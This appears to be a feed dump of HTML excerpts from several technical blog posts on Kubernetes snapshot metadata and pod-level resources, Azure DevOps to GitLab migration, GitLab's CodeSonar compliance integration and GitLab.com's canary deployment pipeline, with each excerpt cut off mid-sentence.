href=\"https://github.com/kubernetes/enhancements/tree/master/keps/sig-storage/3314-csi-changed-block-tracking#the-kubernetes-snapshotmetadata-service-api\">Kubernetes SnapshotMetadataService API</a>.\nAppropriate access grants, such as RBAC RoleBindings, must be established to authorize the backup application\nServiceAccount to obtain such tokens.</p>\n</li>\n<li>\n<p><em>Implement streaming client-side code</em>: Develop clients that implement the streaming gRPC APIs defined in the\n<a href=\"https://github.com/kubernetes-csi/external-snapshot-metadata/blob/main/proto/schema.proto\">schema.proto</a> file.\nSpecifically:</p>\n<ul>\n<li>Implement streaming client code for <code>GetMetadataAllocated</code> and <code>GetMetadataDelta</code> methods</li>\n<li>Handle server-side streaming responses efficiently as the metadata comes in chunks</li>\n<li>Process the <code>SnapshotMetadataResponse</code> message format with proper error handling</li>\n</ul>\n<p>The <code>external-snapshot-metadata</code> GitHub repository provides a convenient\n<a href=\"https://github.com/kubernetes-csi/external-snapshot-metadata/tree/master/pkg/iterator\">iterator</a>\nsupport package to simplify client implementation.</p>\n</li>\n<li>\n<p><em>Handle large dataset streaming</em>: Design clients to efficiently handle large streams of block metadata that\ncould be returned for volumes with significant changes.</p>\n</li>\n<li>\n<p><em>Optimize backup processes</em>: Modify backup workflows to use the changed block metadata to identify and only\ntransfer changed blocks to make backups more efficient, reducing both backup duration and resource consumption.</p>\n</li>\n</ol>\n<h2 id=\"getting-started\">Getting started</h2>\n<p>To use changed block tracking in your cluster:</p>\n<ol>\n<li>Ensure your CSI driver supports volume snapshots and implements the snapshot metadata capabilities with the required <code>external-snapshot-metadata</code> sidecar</li>\n<li>Make sure the SnapshotMetadataService custom resource is registered using CRD</li>\n<li>Verify the presence of a SnapshotMetadataService custom resource for your CSI driver</li>\n<li>Create clients that can access the API using appropriate authentication (via Kubernetes ServiceAccount tokens)</li>\n</ol>\n<p>The API provides two main functions:</p>\n<ul>\n<li><code>GetMetadataAllocated</code>: Lists blocks allocated in a single snapshot</li>\n<li><code>GetMetadataDelta</code>: Lists blocks changed between two snapshots</li>\n</ul>\n<h2 id=\"what-s-next\">What’s next?</h2>\n<p>Depending on feedback and adoption, the

      "summary": "<p>On behalf of the Kubernetes community, I am thrilled to announce that the Pod Level Resources feature has graduated to Beta in the Kubernetes v1.34 release and is enabled by default! This significant milestone introduces a new layer of flexibility for defining and managing resource allocation for your Pods. This flexibility stems from the ability to specify CPU and memory resources for the Pod as a whole. Pod level resources can be combined with the container-level specifications to express the exact resource requirements and limits your application needs.</p>\n<h2 id=\"pod-level-specification-for-resources\">Pod-level specification for resources</h2>\n<p>Until recently, resource specifications that applied to Pods were primarily defined\nat the individual container level. While effective, this approach sometimes required\nduplicating or meticulously calculating resource needs across multiple containers\nwithin a single Pod. As a beta feature, Kubernetes allows you to specify the CPU,\nmemory and hugepages resources at the Pod-level. This means you can now define\nresource requests and limits for an entire Pod, enabling easier resource sharing\nwithout requiring granular, per-container management of these resources where\nit's not needed.</p>\n<h2 id=\"why-does-pod-level-specification-matter\">Why does Pod-level specification matter?</h2>\n<p>This feature enhances resource management in Kubernetes by offering <em>flexible resource management</em> at both the Pod and container levels.</p>\n<ul>\n<li>\n<p>It provides a consolidated approach to resource declaration, reducing the need for\nmeticulous, per-container management, especially for Pods with multiple\ncontainers.</p>\n</li>\n<li>\n<p>Pod-level resources enable containers within a pod to share unused resoures\namongst themselves, promoting efficient utilization within the pod. For example,\nit prevents sidecar containers from becoming performance bottlenecks. Previously,\na sidecar (e.g., a logging agent or service mesh proxy) hitting its individual CPU\nlimit could be throttled and slow down the entire Pod, even if the main\napplication container had plenty of spare CPU. With pod-level resources, the\nsidecar and the main container can share Pod's resource budget, ensuring smooth\noperation during traffic spikes - either the whole Pod is throttled or all\ncontainers work.</p>\n</li>\n<li>\n<p>When both pod-level and container-level resources are specified, pod-level\nrequests and limits take precedence. This gives you – and cluster administrators -\na powerful way to enforce overall resource boundaries for your Pods.</p>\n<p>For scheduling, if a pod-level request is explicitly defined, the scheduler uses\nthat specific value to find a suitable node, insteaf of the aggregated requests of\nthe individual containers. At runtime, the pod-level limit acts as a hard ceiling\nfor the combined resource usage of all containers. Crucially, this pod-level limit\nis the absolute enforcer; even if the sum of the individual container limits is\nhigher, the total resource consumption can never exceed the pod-level limit.</p>\n</li>\n<li>\n<p>Pod-level resources are <strong>prioritized</strong> in influencing the Quality of Service (QoS) class of the Pod.</p>\n</li>\n<li>\n<p>For Pods running on Linux nodes, the Out-Of-Memory (OOM) score adjustment\ncalculation considers both pod-level and container-level resources requests.</p>\n</li>\n<li>\n<p>Pod-level resources are <strong>designed to be compatible with existing Kubernetes functionalities</strong>, ensuring a smooth integration into your workflows.</p>\n</li>\n</ul>\n<h2 id=\"how-to-specify-resources-for-an-entire-pod\">How to specify resources for an entire Pod</h2>\n<p>Using <code>PodLevelResources</code> <a href=\"https://kubernetes.io/docs/reference/command-line-tools-reference/feature-gates/\">feature\ngate</a> requires\nKubernetes v1.34 or newer for all cluster components, including the control plane\nand every node. This feature gate is in beta and enabled by default in v1.34.</p>\n<h3 id=\"example-manifest\">Example manifest</h3>\n<p>You can specify CPU, memory and hugepages resources directly in the Pod spec manifest at the <code>resources</code> field for the entire Pod.</p>\n<p>Here’s an example demonstrating a Pod with both CPU and memory requests and limits\ndefined at the Pod level:</p>\n<div class=\"highlight\"><pre tabindex=\"0\"><code class=\"language-yaml\"><span style=\"display: flex;\"><span><span style=\"color: #008000;

The sum of resources consumed by all its containers is enforced at this ceiling and cannot be surpassed.</p>\n</li>\n<li>\n<p>Resource Sharing and Bursting: Containers can dynamically borrow any unused capacity, allowing them to burst as needed, so long as the Pod's aggregate usage stays within the overall limit.</p>\n</li>\n<li>\n<p>Pod-Level Requests: The pod-level requests (cpu: &quot;1&quot;, memory: &quot;100Mi&quot;) serve as the foundational resource guarantee for the entire Pod. This value informs the scheduler's placement decision and represents the minimum resources the Pod can rely on during node-level contention.</p>\n</li>\n<li>\n<p>Container-Level Requests: Container-level requests create a priority system within\nthe Pod's guaranteed budget. Because main-app-container has an explicit request\n(cpu: &quot;0.5&quot;, memory: &quot;50Mi&quot;), it is given precedence for its share of resources\nunder resource pressure over the auxiliary-container, which has no\nsuch explicit claim.</p>\n</li>\n</ul>\n<h2 id=\"limitations\">Limitations</h2>\n<ul>\n<li>\n<p>First of all, <a href=\"https://kubernetes.io/docs/concepts/workloads/pods/#pod-update-and-replacement\">in-place\nresize</a> of pod-level\nresources is <strong>not supported</strong> for Kubernetes v1.34 (or earlier). Attempting to\nmodify the <em>pod-level</em> resource limits or requests on a running Pod results in an\nerror: the resize is rejected. The v1.34 implementation of Pod level resources\nfocuses on allowing initial declaration of an overall resource envelope, that\napplies to the <strong>entire Pod</strong>. That is distinct from in-place pod resize, which\n(despite what the name might suggest) allows you\nto make dynamic adjustments to <em>container</em> resource\nrequests and limits, within a <em>running</em> Pod,\nand potentially without a container restart. In-place resizing is also not yet a\nstable feature; it graduated to Beta in the v1.33 release.</p>\n</li>\n<li>\n<p>Only CPU, memory, and hugepages resources can be specified at pod-level.</p>\n</li>\n<li>\n<p>Pod-level resources are not supported for Windows pods. If the Pod specification\nexplicitly targets Windows (e.g., by setting spec.os.name: &quot;windows&quot;), the API\nserver will reject the Pod during the validation step. If the Pod is not explicitly\nmarked for Windows but is scheduled to a Windows node (e.g., via a nodeSelector),\nthe Kubelet on that Windows node will reject the Pod during its admission process.</p>\n</li>\n<li>\n<p>The Topology Manager, Memory Manager and CPU Manager do not\nalign pods and containers based on pod-level resources as these resource managers\ndon't currently support pod-level resources.</p>\n</li>\n</ul>\n<h4 id=\"getting-started-and-providing-feedback\">Getting started and providing feedback</h4>\n<p>Ready to explore <em>Pod Level Resources</em> feature?

These options support repository-by-repository or bulk migration and preserve git commit history, branches, and tags. With Congregate and professional services tools, we support additional assets such as wikis, work items, CI/CD variables, container images, packages, pipelines, and more (see this <a href=\"https://gitlab.com/gitlab-org/professional-services-automation/tools/migration/congregate/-/blob/master/customer/ado-migration-features-matrix.md\">feature matrix</a>).

Identify champions or groups familiar with both ADO and GitLab platforms (such as early adopters) to help drive adoption and provide guidance.</p>\n<p><strong>Inventory what you need to migrate:</strong></p>\n<ul>\n<li>\n<p>The number of repositories, pull requests, and contributors</p>\n</li>\n<li>\n<p>The number and complexity of work items and pipelines</p>\n</li>\n<li>\n<p>Repository sizes and dependency relationships</p>\n</li>\n<li>\n<p>Critical integrations and runner requirements (agent pools with specific capabilities)</p>\n</li>\n</ul>\n<p>Use GitLab Professional Services's <a href=\"https://gitlab.com/gitlab-org/professional-services-automation/tools/utilities/evaluate#beta-azure-devops\">Evaluate</a> tool to produce a complete inventory of your entire Azure DevOps organization, including repositories, PR counts, contributor lists, number of pipelines, work items, CI/CD variables and more. If you're working with the GitLab Professional Services team, share this report with your engagement manager or technical architect to help plan the migration.</p>\n<p>Migration timing is primarily driven by pull request count, repository size, and amount of contributions (e.g. comments in PR, work items, etc). For example, 1,000 small repositories with few PRs and limited contributors can migrate much faster than a smaller set of repositories containing tens of thousands of PRs and thousands of contributors. Use your inventory data to estimate effort and plan test runs before proceeding with production migrations.</p>\n<p>Compare inventory against your desired timeline and decide whether to migrate all repositories at once or in batches. If teams cannot migrate simultaneously, batch and stagger migrations to align with team schedules. For example, in Professional Services engagements, we organize migrations into waves of 200-300 projects to manage complexity and respect API rate limits, both in <a href=\"https://docs.gitlab.com/security/rate_limits/\">GitLab</a> and <a href=\"https://learn.microsoft.com/en-us/azure/devops/integrate/concepts/rate-limits?view=azure-devops\">ADO</a>.</p>\n<p>GitLab's built-in <a href=\"https://docs.gitlab.com/user/project/import/repo_by_url/\">repository importer</a> migrates Git repositories (commits, branches, and tags) one-by-one. Congregate is designed to preserve pull requests (known in GitLab as merge requests), comments, and related metadata where possible; the simple built-in repository import focuses only on the Git data (history, branches, and tags).</p>\n<p><strong>Items that typically require separate migration or manual recreation:</strong></p>\n<ul>\n<li>\n<p>Azure Pipelines - create equivalent GitLab CI/CD pipelines (consult with <a href=\"https://docs.gitlab.com/ci/yaml/\">CI/CD YAML</a> and/or with <a href=\"https://docs.gitlab.com/ci/components/\">CI/CD components</a>). Alternatively, consider using AI-based pipeline conversion available in Congregate.</p>\n</li>\n<li>\n<p>Work items and boards - map to GitLab Issues, Epics, and Issue Boards.</p>\n</li>\n<li>\n<p>Artifacts, container images (ACR) - migrate to GitLab Package Registry or Container Registry.</p>\n</li>\n<li>\n<p>Service hooks and external integrations - recreate in GitLab.</p>\n</li>\n<li>\n<p><a href=\"https://docs.gitlab.com/user/permissions/\">Permissions models</a> differ between ADO and GitLab; review and plan permissions mapping rather than assuming exact preservation.</p>\n</li>\n</ul>\n<p>Review what each tool (Congregate vs. built-in import) will migrate and choose the one that fits your needs. Make a list of any data or integrations that must be migrated or recreated manually.</p>\n<p><strong>Who will run the migration?</strong></p>\n<p>Migrations are typically run by a GitLab group owner or instance administrator, or by a designated migrator who has been granted the necessary permissions on the destination group/project. Congregate and the GitLab import APIs require valid authentication tokens for both Azure DevOps and GitLab.</p>\n<ul>\n<li>\n<p>Decide whether a group owner/admin will perform the migrations or whether you will grant a specific team/person delegated access.</p>\n</li>\n<li>\n<p>Ensure the migrator has correctly configured personal access tokens (Azure DevOps and GitLab) with the scopes required by your chosen migration tool (for example, api/read_repository scopes and any tool-specific requirements).</p>\n</li>\n<li>\n<p>Test tokens and permissions with a small pilot migration.</p>\n</li>\n</ul>\n<p><strong>Note:</strong> Congregate leverages file-based import functionality for ADO migrations and requires instance administrator permissions to run (<a href=\"https://docs.gitlab.com/user/project/settings/import_export/#migrate-projects-by-uploading-an-export-file\">see our documentation</a>). If you are migrating to GitLab.com, consider engaging Professional Services. For more information, see the <a href=\"https://about.gitlab.com/professional-services/catalog/\">Professional Services Full Catalog</a>.

Consider how teams will work in GitLab and design the structure to facilitate collaboration and access management. Here is a way to think about mapping ADO structure to GitLab structure:</p>\n<pre><code class=\"language-mermaid\">graph TD\n    subgraph GitLab\n        direction TB\n        A[&quot;Top-level Group&quot;]\n        B[&quot;Subgroup (optional)&quot;]\n        C[&quot;Projects&quot;]\n        A --&gt; B\n        A --&gt; C\n        B --&gt; C\n    end\n\n    subgraph AzureDevOps[&quot;Azure DevOps&quot;]\n        direction TB\n        F[&quot;Organizations&quot;]\n        G[&quot;Projects&quot;]\n        H[&quot;Repositories&quot;]\n        F --&gt; G\n        G --&gt; H\n    end\n\n    style A fill:#FC6D26\n    style B fill:#FC6D26\n    style C fill:#FC6D26\n    style F fill:#8C929D\n    style G fill:#8C929D\n    style H fill:#8C929D\n</code></pre>\n<p>Recommended approach:</p>\n<ul>\n<li>\n<p>Map each ADO organization to a GitLab group (or a small set of groups), not to many small groups. Avoid creating a GitLab group for every ADO team project. Use migration as an opportunity to rationalize your GitLab structure.</p>\n</li>\n<li>\n<p>Use subgroups and project-level permissions to group related repositories.</p>\n</li>\n<li>\n<p>Manage access to sets of projects by using GitLab groups and group membership (groups and subgroups) rather than one group per team project.</p>\n</li>\n<li>\n<p>Review GitLab <a href=\"https://docs.gitlab.com/ee/user/permissions.html\">permissions</a> and consider <a href=\"https://docs.gitlab.com/user/group/saml_sso/group_sync/\">SAML Group Links</a> to implement an enterprise RBAC model for your GitLab instance (or a GitLab.com namespace).</p>\n</li>\n</ul>\n<p><strong>ADO Boards and work items: State of migration</strong></p>\n<p>It's important to understand how work items migrate from ADO into GitLab Plan (issues, epics, and boards).</p>\n<ul>\n<li>\n<p>ADO Boards and work items map to GitLab Issues, Epics, and Issue Boards. Plan how your workflows and board configurations will translate.</p>\n</li>\n<li>\n<p>ADO Epics and Features become GitLab Epics.</p>\n</li>\n<li>\n<p>Other work item types (e.g., user stories, tasks, bugs) become project-scoped issues.</p>\n</li>\n<li>\n<p>Most standard fields are preserved; selected custom fields can be migrated when supported.</p>\n</li>\n<li>\n<p>Parent-child relationships are retained so Epics reference all related issues.</p>\n</li>\n<li>\n<p>Links to pull requests are converted to merge request links to maintain development traceability.</p>\n</li>\n</ul>\n<p>Example: Migration of an individual work item to a GitLab Issue, including field accuracy and relationships:</p>\n<p><img alt=\"Example: Migration of an individual work item to a GitLab Issue\" src=\"https://res.cloudinary.com/about-gitlab-com/image/upload/v1764769188/ztesjnxxfbwmfmtckyga.png\" /></p>\n<p>Batching guidance:</p>\n<ul>\n<li>\n<p>If you need to run migrations in batches, use your new group/subgroup structure to define batches (for example, by ADO organization or by product area).</p>\n</li>\n<li>\n<p>Use inventory reports to drive batch selection and test each batch with a pilot migration before scaling.</p>\n</li>\n</ul>\n<p><strong>Pipelines migration</strong></p>\n<p>Congregate <a href=\"https://gitlab.com/gitlab-org/professional-services-automation/tools/migration/congregate/-/merge_requests/1298\">recently introduced</a> AI-powered conversion for multi-stage YAML pipelines from Azure DevOps to GitLab CI/CD.

      "summary": "<p>Embedded systems development teams face a persistent challenge: maintaining development velocity while meeting stringent functional safety and code quality requirements. Standards like ISO 26262, IEC 62304, DO-178C, and IEC 61508 demand rigorous verification processes that are often manual and time-consuming. Compliance reviews against coding standards like MISRA C/C++, isolated scanning workflows, and post-development verification create bottlenecks. Teams are forced to choose between speed and safety.</p>\n<p><a href=\"https://gitlab.com/explore/catalog/codesonar/components/codesonar-ci\">GitLab's integration with CodeSonar</a> (from AdaCore) addresses this challenge by automating compliance workflows and enabling continuous verification throughout the development lifecycle.</p>\n<h2>Specialized scanning for safety-critical systems</h2>\n<p>Safety-critical systems require deep analysis of C/C++ code compiled with specialized embedded tools. These systems must demonstrate compliance with coding standards (MISRA C/C++, CERT C/C++, AUTOSAR C++) and functional safety frameworks (ISO 26262, DO-178C, IEC 61508) that require detailed evidence trails. Beyond aligning with coding standards, teams also need to address security concerns. This means testing for memory problems as well as a host of other problems like uninitialized variables and command injection.</p>\n<p><a href=\"https://www.adacore.com/codesonar\">CodeSonar</a> performs whole program analysis with specialized scanning capabilities for these standards. Pairing CodeSonar with GitLab enables teams to automate compliance workflows and maintain comprehensive audit trails throughout the development lifecycle.</p>\n<h2>Automating compliance from commit to merge</h2>\n<p>The GitLab and CodeSonar integration provides a compliance-as-code approach that automates policy enforcement from the earliest stages of development. CodeSonar functions as an additional scanner within <a href=\"https://docs.gitlab.com/ci/\">GitLab CI/CD pipelines</a>, analyzing code in every commit and merge request.</p>\n<p>Because CodeSonar was purpose-built for embedded systems, it performs deep control flow and data flow analysis across entire programs, identifying vulnerabilities like buffer overruns, data taint, uninitialized variables, use-after-free conditions, and command injection — the root causes of most security incidents in embedded systems.</p>\n<p>The integration works through GitLab's CI/CD configuration. When developers push code changes, the pipeline triggers CodeSonar scanning. For C and C++ firmware, CodeSonar observes compiler invocations during the actual build process, creating an internal representation of the code that enables sophisticated analysis. Results are converted from SARIF format to GitLab's Static Application Security Testing (<a href=\"https://docs.gitlab.com/user/application_security/sast/\">SAST</a>) format and surfaced directly in merge requests, where they feed into GitLab Ultimate's Security Dashboard, Vulnerability Management, and <a href=\"https://docs.gitlab.com/user/compliance/compliance_frameworks/\">Compliance Frameworks</a>.</p>\n<h2>Example workflow: ISO 26262 ASIL-D compliance</h2>\n<p>The demo video below shows the complete workflow for an embedded system subject to ISO 26262 ASIL-D requirements. The scenario illustrates how embedded development teams can implement continuous compliance without compromising development velocity.</p>\n<p>&lt;div style=&quot;padding:56.25% 0 0 0;position:relative;&quot;&gt;&lt;iframe src=&quot;https://player.vimeo.com/video/1139086924?badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479&quot; frameborder=&quot;0&quot; allow=&quot;autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; style=&quot;position:absolute;top:0;left:0;width:100%;height:100%;&quot; title=&quot;Automated Compliance for Embedded Systems using GitLab and CodeSonar&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&lt;script src=&quot;https://player.vimeo.com/api/player.js&quot;&gt;&lt;/script&gt;`</p>\n<p>The workflow begins with a developer submitting a merge request for firmware changes. GitLab's CI/CD pipeline automatically triggers CodeSonar scanning, which performs deep C/C++ analysis against custom ISO 26262 policies configured in the pipeline. When CodeSonar identifies an ASIL-D relevant vulnerability, the pipeline halts automatically per the compliance policy, with clear documentation explaining the issue. The complete scan results, issue tracking, and approval workflow are maintained in GitLab as a single source of truth for audit trails.</p>\n<p>Developers can use both the CodeSonar hub interface and <a href=\"https://docs.gitlab.com/user/gitlab_duo/\">GitLab Duo AI</a> to understand the vulnerability. CodeSonar provides detailed information about the path through the source code that leads to the problem, along with code navigation features to isolate the root cause. GitLab Duo <a href=\"https://docs.gitlab.com/user/application_security/vulnerabilities/#vulnerability-explanation\">explains the vulnerability</a> and provides specific <a href=\"https://docs.gitlab.com/user/application_security/vulnerabilities/#vulnerability-resolution\">remediation recommendations</a>. After the developer implements the fix and validates the resolution, the code merges successfully with full compliance evidence automatically collected throughout the process.</p>\n<h2>Benefits of the integration</h2>\n<p>Organizations implementing this integrated compliance with GitLab and CodeSonar will see significant improvements in both development velocity and compliance confidence.</p>\n<ul>\n<li>\n<p><strong>Efficiency gains:</strong> Development teams reduce time-to-market by catching coding standard compliance issues early when they're less expensive to fix. Automated security policy enforcement decreases manual security review overhead, freeing specialists to focus on complex problems rather than routine checks. Audit readiness improves through automated evidence collection. Compliance artifacts are generated as a by-product of normal development rather than through separate documentation efforts.</p>\n</li>\n<li>\n<p><strong>Compliance maturity:</strong> This integrated approach helps organizations maintain continuous compliance with industry standards and regulations. By embedding verification into every code change, teams build comprehensive audit trails that demonstrate adherence to ISO 26262, DO-178C, MISRA C/C++, and other requirements. The automated workflow transforms compliance from a periodic checkpoint into an ongoing verification process.</p>\n</li>\n</ul>\n<h2>Implementation considerations</h2>\n<p>Implementing the GitLab and CodeSonar integration requires access to GitLab Ultimate, a CodeSonar hub, GitLab runners where code can be compiled and analyzed, and appropriate mechanisms for managing analysis data files. Both GitLab and CodeSonar fully support <strong>on-premises and air-gapped environments</strong> and can be deployed to auto-scalable cloud environments as well.</p>\n<p>Teams should configure <a href=\"https://about.gitlab.com/blog/introducing-custom-compliance-frameworks-in-gitlab/\">Custom Compliance Frameworks</a> in GitLab to define specific policies for their relevant standards: ISO 26262 for automotive, DO-178C for aerospace, IEC 62304 for medical devices, and others. These frameworks enable automated enforcement of compliance requirements through merge request approval rules, vulnerability thresholds, and scan policy gates.</p>\n<h1>Get started</h1>\n<p>The <a href=\"https://gitlab.com/explore/catalog/codesonar/components/codesonar-ci\">CodeSonar GitLab CI component</a> is available through GitLab's CI/CD Catalog. Detailed integration documentation provides platform-specific setup instructions for Linux, Docker, and Windows environments. For organizations evaluating this solution, the implementation demonstrates how specialized embedded systems tools can integrate with a modern DevSecOps platform to deliver both development velocity and compliance rigor.</p>\n<p>For more information about implementing GitLab with CodeSonar for your embedded systems development, visit the <a href=\"https://support-resources.codesecure.com/integrations/gitlab/documentation/\">CodeSonar integration documentation</a>.

You benefit from:</p>\n<ul>\n<li>Latest features available immediately: New capabilities reach you within hours of completion, not in quarterly release cycles</li>\n<li>Proven reliability at scale: If a feature works on GitLab.com, you can trust it in your environment</li>\n<li>Full value of GitLab: Zero-downtime deployments mean you never lose access to your DevOps platform, even during updates</li>\n<li>Real-world tested practices: Our deployment documentation isn't theory — it's exactly how we run the largest GitLab instance in existence</li>\n</ul>\n<h2>Code flow architecture</h2>\n<p>Our deployment pipeline follows a structured progression through multiple stages, each acting as a checkpoint on the journey from code proposal to production deployment.</p>\n<pre><code class=\"language-mermaid\">  graph TD\n      A[Code Proposed] --&gt; B[Merge Request Created]\n      B --&gt; C[Pipeline Triggered]\n      C --&gt; D[Build &amp; Test]\n      D --&gt; E{Spec/Integration/QA Tests Pass?}\n      E --&gt;|No| F[Feedback Loop]\n      F --&gt; B\n      E --&gt;|Yes| G[Merge to default branch]\n      G --&gt;|Periodically| H[Auto-Deploy Branch]\n\n      subgraph &quot;Deployment Pipeline&quot;\n          H --&gt; I[Package Creation]\n          I --&gt; K[Canary Environment]\n          K --&gt; L[QA Validation]\n          L --&gt; M[Main Environment]\n\n      end\n</code></pre>\n<h2>Deployment pipeline makeup</h2>\n<p>Our deployment approach uses GitLab's native CI/CD capabilities to orchestrate complex deployments across hybrid infrastructure.\nHere's how we do it.</p>\n<h3>Build</h3>\n<p>Building GitLab is a complex topic in and of itself, so I'll go over the details at a high level.</p>\n<p>We build both our Omnibus package and our Cloud Native GitLab (CNG) images. The Omnibus packages deploy to our Gitaly fleet (our Git storage layer), while CNG images run all other components as containerized workloads. Other stateful services like Postgres and Redis have grown so large we have dedicated teams managing them separately. For GitLab.com, those systems are not deployed during our Auto-Deploy procedures.</p>\n<p>We have a scheduled pipeline that will regularly look at <code>gitlab-org/gitlab</code> and search for the most recent commit on the default branch with a successful (“green”) pipeline. Green pipelines signal that every component of GitLab has passed its comprehensive test suite. We then create an <strong>auto-deploy branch</strong> from that commit.</p>\n<p>This triggers a sequence of events: primarily, the need to build this package and all components that are a part of our monolith.\nAnother scheduled pipeline selects the latest built package and initiates the deployment pipeline. Procedurally, it looks this simple:</p>\n<pre><code class=\"language-mermaid\">  graph LR\n      A[Create branch] --&gt; B[Build]\n      B --&gt; C[Choose Built package]\n      C --&gt; D[Start Deploy Pipeline]\n</code></pre>\n<p>Building takes some time, and since deployments can vary due to various circumstances, we choose the latest build to deploy. We technically build more versions of GitLab for .com than will ever be deployed. This enables us to always have a package lined up ready to go, and this brings us the closest we can be to having a full continuously delivered product for .com.</p>\n<h3>Environment-based validation and Canary strategy</h3>\n<p>Quality assurance (QA) isn't just an afterthought here — it's baked into every layer from development through deployment. Our QA process leverages automated test suites that include unit tests, integration tests, and end-to-end tests that simulate real user interactions with GitLab's features. But more importantly for our deployment pipeline, our QA process works hand-in-hand with our Canary strategy through environment-based validation.</p>\n<p>As part of our validation approach, we leverage GitLab's native <a href=\"https://docs.gitlab.com/user/project/canary_deployments/\">Canary deployments</a>, enabling controlled validation of changes with limited traffic exposure before full production deployment. <a href=\"https://handbook.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/#environments-canary-stage\">We send roughly 5% of all traffic through our Canary stage</a>. This approach increases the complexity of database migrations, but successfully navigating Canary deployments ensures we deploy a reliable product seamlessly.</p>\n<p>The Canary deployment features you use in GitLab were refined through managing one of the most complex deployment scenarios in production. When you implement Canary deployments for your applications, you're using patterns proven at massive scale.</p>\n<p>Our deployment process follows a progressive rollout strategy:</p>\n<ol>\n<li>\n<p><strong>Staging Canary:</strong> Initial validation environment</p>\n</li>\n<li>\n<p><strong>Production Canary:</strong> Limited production traffic</p>\n</li>\n<li>\n<p><strong>Staging Main:</strong> Full staging environment deployment</p>\n</li>\n<li>\n<p><strong>Production Main:</strong> Full production rollout</p>\n</li>\n</ol>\n<pre><code class=\"language-mermaid\">  graph TD\n      C[Staging Canary Deploy]\n      C --&gt; D[QA Smoke Main Stage Tests]\n      C --&gt; E[QA Smoke Canary Stage Tests]\n      D --&gt; F\n      E --&gt; F{Tests Pass?}\n      F --&gt;|Yes| G[Production Canary Deploy]\n      G --&gt; S[QA Smoke Main Stage Tests]\n      G --&gt; T[QA Smoke Canary Stage Tests]\n      F --&gt;|No| H[Issue Creation]\n      H --&gt; K[Fix &amp; Backport]\n      K --&gt; C\n\n      S --&gt; M[Canary Traffic Monitoring]\n      T --&gt; M[Canary Traffic Monitoring baking period]\n      M --&gt; U[Production Safety Checks]\n      U --&gt; N[Staging Main]\n      N --&gt; V[Production Main]\n</code></pre>\n<p>Our QA validation occurs at multiple checkpoints throughout this progressive deployment process: after each Canary deployment, and again after post-deploy migrations. This multilayered approach ensures that each phase of our deployment strategy has its own safety net. You can learn more about <a href=\"https://handbook.gitlab.com/handbook/engineering/testing/\">GitLab's comprehensive testing approach</a> in our handbook.</p>\n<h2>Deployment pipeline</h2>\n<p>Here are the challenges we address across our deployment pipeline.</p>\n<h3>Technical architecture considerations</h3>\n<p>GitLab.com represents real-world deployment complexity at scale. As the largest known GitLab instance, deployments use our official GitLab Helm chart and the official Linux package — the same artifacts our customers use. You can learn more about <a href=\"https://handbook.gitlab.com/handbook/engineering/infrastructure/production/architecture/#gitlab-com-architecture\">the GitLab.com architecture</a> in our handbook. This hybrid approach means our deployment pipeline must intelligently handle both containerized services and traditional Linux services in the same deployment cycle.</p>\n<p><strong>Dogfooding at scale:</strong> We deploy using the same procedures we document for <a href=\"https://docs.gitlab.com/update/zero_downtime/\">zero-downtime upgrades</a>. If something doesn't work smoothly for us, we don't recommend it to customers. This self-imposed constraint drives continuous improvement in our deployment tooling.</p>\n<p>The following stages are run for all environment and stage upgrades:</p>\n<pre><code class=\"language-mermaid\">  graph LR\n      a[prep] --&gt; c[Regular Migrations - Canary stage only]\n      a --&gt; f[Assets - Canary stage only]\n      c --&gt; d[Gitaly]\n      d --&gt; k8s\n\n      subgraph subGraph0[&quot;VM workloads&quot;]\n        d[&quot;Gitaly&quot;]\n      end\n\n      subgraph subGraph1[&quot;Kubernetes workloads&quot;]\n        k8s[&quot;k8s&quot;]\n      end\n\n      subgraph fleet[&quot;fleet&quot;]\n        subGraph0\n        subGraph1\n      end\n</code></pre>\n<p><strong>Stage details:</strong></p>\n<ul>\n<li>\n<p><strong>Prep:</strong> Validates deployment readiness and performs pre-deployment checks</p>\n</li>\n<li>\n<p><strong>Migrations:</strong> Executes database regular migrations. This only happens during the Canary stage. Because both Canary and Main stages share the same database, these changes are already available when the Main stage deploys, eliminating the need to repeat these tasks.</p>\n</li>\n<li>\n<p><strong>Assets:</strong> We leverage a GCS bucket for all static assets. If any new assets are created, we upload these to our bucket such that they are immediately available to our Canary stage. As we leverage WebPack for assets, and properly leverage SHAs in the naming of our assets, we can confidently not worry that we override an older asset. Therefore, old assets continue to be available for older deployments and new assets are imemdiately made available when Canary begins its deploy. This only happens during the Canary stage deployment. Because Canary and Main stages share the same asset storage, these changes are already available when the Main stage deploys.</p>\n</li>\n<li>\n<p><strong>Gitaly:</strong> Updates Gitaly Virtual Machine storage layer via our Omnibus Linux package on each Gitaly node. This service is unique as we <a href=\"https://gitlab.com/gitlab-org/gitaly/-/blob/master/doc/git-execution-environments.md\">bundle it with <code>git</code></a>. Therefore, we need to ensure that this service is capable of atomic upgrades. We leverage a <a href=\"https://gitlab.com/gitlab-org/gitaly/-/tree/master/cmd/gitaly-wrapper\">wrapper around Gitaly</a>, which enables us to install a newer version of Gitaly and make use of the library <a href=\"https://github.com/cloudflare/tableflip\"><code>tableflip</code></a> to cleanly rotate the running Gitaly, ensuring high availability of this service on each of our instances.</p>\n</li>\n<li>\n<p><strong>Kubernetes:</strong> Deploys containerized GitLab components via our Helm chart. Note that we deploy to numerous clusters spread across Zones for redundancy, so these are usually broken into their own stages to minimize harm and sometimes allows us to stop mid-deploy if critical issues are detected.</p>\n</li>\n</ul>\n<h3>Multi-version compatibility: The hidden challenge</h3>\n<p>As you read our process, you will notice that there's a period of time where our database schema is ahead of the code that the Main stage knows about. This happens because the Canary stage has already deployed new code and runs regular database migrations, but the Main stage is still running the previous version of the code that doesn't know about these new database changes.</p>\n<p><strong>Real-world example:</strong> Imagine we're adding a new <code>merge_readiness</code> field to merge requests. During deployment, some servers are running code that expects this field. while others don't know it exists yet. If we handle this poorly, we break GitLab.com for millions of users. If we handle it well, nobody notices anything happened.</p>\n<p>This occurs with most other services, as well. For example, if a client sends multiple requests, there's a chance one of them might land in our Canary stage; other requests might be directed to the Main stage. This is not too different from a deploy as it does take a decent amount of time to roll through the few thousand Pods that run our services.</p>\n<p>With a few exceptions, the vast majority of our services will run a slightly newer version of that component in Canary for a period of time. In a sense, these scenarios are all transient states. But they can often persist for several hours or days in a live, production environment. Therefore, we must treat them with the same care as permanent states. During any deployment, we have multiple versions of 